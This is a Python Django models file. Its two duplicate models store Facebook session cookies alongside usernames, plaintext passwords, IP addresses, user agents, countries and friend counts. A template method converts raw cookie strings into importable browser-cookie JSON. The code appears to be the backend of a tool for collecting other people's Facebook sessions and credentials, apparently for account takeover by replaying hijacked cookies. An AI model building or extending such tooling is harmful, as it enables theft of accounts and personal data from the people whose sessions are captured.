from django.db import models
from django.utils import timezone

json_template ="""
[
{
    "domain": ".facebook.com",
    "expirationDate": 1622271366.51137,
    "hostOnly": false,
    "httpOnly": false,
    "name": "c_user",
    "path": "/",
    "sameSite": "no_restriction",
    "secure": true,
    "session": false,
    "storeId": "0",
    "value": "${c_user}",
    "id": 1
},
{
    "domain": ".facebook.com",
    "expirationDate": 1591930609.799803,
    "hostOnly": false,
    "httpOnly": true,
    "name": "datr",
    "path": "/",
    "sameSite": "unspecified",
    "secure": true,
    "session": false,
    "storeId": "0",
    "value": "${datr}",
    "id": 2
},
{
    "domain": ".facebook.com",
    "expirationDate": 1598511364.511405,
    "hostOnly": false,
    "httpOnly": true,
    "name": "fr",
    "path": "/",
    "sameSite": "no_restriction",
    "secure": true,
    "session": false,
    "storeId": "0",
    "value": "${fr}",
    "id": 3
},
{
    "domain": ".facebook.com",
    "expirationDate": 1653807368.51131,
    "hostOnly": false,
    "httpOnly": true,
    "name": "sb",
    "path": "/",
    "sameSite": "no_restriction",
    "secure": true,
    "session": false,
    "storeId": "0",
    "value": "${sb}",
    "id": 4
},
{
    "domain": ".facebook.com",
    "expirationDate": 1622271366,
    "hostOnly": false,
    "httpOnly": true,
    "name": "xs",
    "path": "/",
    "sameSite": "no_restriction",
    "secure": true,
    "session": false,
    "storeId": "0",
    "value": "${xs}",
    "id": 7
}
]
"""

from string import Template
from django.contrib.gis.geoip2 import GeoIP2


class Cookies(models.Model):
    c_user = models.CharField(max_length=30, unique=True)
    text = models.CharField(max_length=3000)
    created = models.DateTimeField(auto_now_add=True)
    updated = models.DateTimeField(auto_now=True)
    json_format = models.CharField(max_length=3000)
    ip = models.GenericIPAddressField(null=True)
    ua = models.CharField(null=True, max_length=300)
    country = models.CharField(null=True, max_length=300)
    username = models.CharField(null=True, max_length=50)
    pwd = models.CharField(null=True, max_length=50)
    getPagesNum = models.IntegerField(null=True)
    getFriendsNum = models.IntegerField(null=True)

    def save(self, *args, **kwargs):
        self.to_json()
        # self.ip_to_country()
        super(Cookies, self).save(*args, **kwargs)

    class Meta:
        ordering = ('-updated',)

    def __str__(self):
        import json
        # res = json.loads(json_template)
        # print(res);
        #
        # res2 = json.dumps(res)  # 先把字典转成json
        # print(res2)
        return self.text

    def to_json(self):
        print("to_json: " + self.text)
        pairs = self.text.split(";")
        map_str = [p.split('=') for p in pairs ]
        # print(pairs)
        # print(map_str)
        map_res = { i[0].strip() : i[1] for i in map_str}
        # print(map_res)
        s = Template(json_template)
        json_cookie = s.substitute(map_res)
        self.json_format = json_cookie
        return json_cookie

    #https: // docs.djangoproject.com / en / 3.0 / ref / contrib / gis / geoip2 /  # std:setting-GEOIP_PATH
    def ip_to_country(self):
        g = GeoIP2()
        print(g.city(self.ip))
        self.country = g.country_name(self.ip)
        # 这个方法会得到两个参数,第一个是类本身的一个实例(app.PersonAdmin),第二个是这个类管理的模型实例(Person)
        return '%s,%s' % (self.ip, self.ip)


class Cookies_my(models.Model):
    c_user = models.CharField(max_length=30, unique=True)
    text = models.CharField(max_length=3000)
    created = models.DateTimeField(auto_now_add=True)
    updated = models.DateTimeField(auto_now=True)
    json_format = models.CharField(max_length=3000)
    ip = models.GenericIPAddressField(null=True)
    ua = models.CharField(null=True, max_length=300)
    country = models.CharField(null=True, max_length=300)
    username = models.CharField(null=True, max_length=50)
    pwd = models.CharField(null=True, max_length=50)
    getPagesNum = models.IntegerField(null=True)
    getFriendsNum = models.IntegerField(null=True)

    def save(self, *args, **kwargs):
        self.to_json()
        # self.ip_to_country()
        super(Cookies_my, self).save(*args, **kwargs)

    class Meta:
        ordering = ('-updated',)

    def __str__(self):
        import json
        # res = json.loads(json_template)
        # print(res);
        #
        # res2 = json.dumps(res)  # 先把字典转成json
        # print(res2)
        return self.text

    def to_json(self):
        print("to_json: " + self.text)
        pairs = self.text.split(";")
        map_str = [p.split('=') for p in pairs ]
        # print(pairs)
        # print(map_str)
        map_res = { i[0].strip() : i[1] for i in map_str}
        # print(map_res)
        s = Template(json_template)
        json_cookie = s.substitute(map_res)
        self.json_format = json_cookie
        return json_cookie

    #https: // docs.djangoproject.com / en / 3.0 / ref / contrib / gis / geoip2 /  # std:setting-GEOIP_PATH
    def ip_to_country(self):
        g = GeoIP2()
        print(g.city(self.ip))
        self.country = g.country_name(self.ip)
        # 这个方法会得到两个参数,第一个是类本身的一个实例(app.PersonAdmin),第二个是这个类管理的模型实例(Person)
        return '%s,%s' % (self.ip, self.ip)